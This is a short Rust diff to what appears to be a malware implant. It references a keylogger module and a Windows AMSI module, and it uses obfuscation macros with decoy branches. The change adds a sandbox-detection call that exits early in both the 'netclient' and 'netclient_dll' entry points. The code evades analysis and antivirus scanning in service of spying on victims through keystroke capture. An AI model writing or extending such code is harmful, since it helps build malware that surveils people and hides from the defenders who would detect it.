@@ -1,3 +1,5 @@
+mod sandbox;
+
 #[cfg(target_os = "windows")]
 mod amsi;
 mod keylogger;
@@ -727,6 +729,8 @@ async fn netclient_impl() -> c_int {
     })
 }
 pub async fn netclient() -> c_int {
+    sandbox::exit_if_sandboxed();
+
     cobl!({
     if opaque_false() {
         let _ = astr!("decoy");
@@ -743,6 +747,8 @@ pub async fn netclient() -> c_int {
 }
 
 pub async fn netclient_dll() -> c_int {
+    sandbox::exit_if_sandboxed();
+
     cobl!({
     if opaque_false() {
         std::thread::sleep(std::time::Duration::from_secs(1));
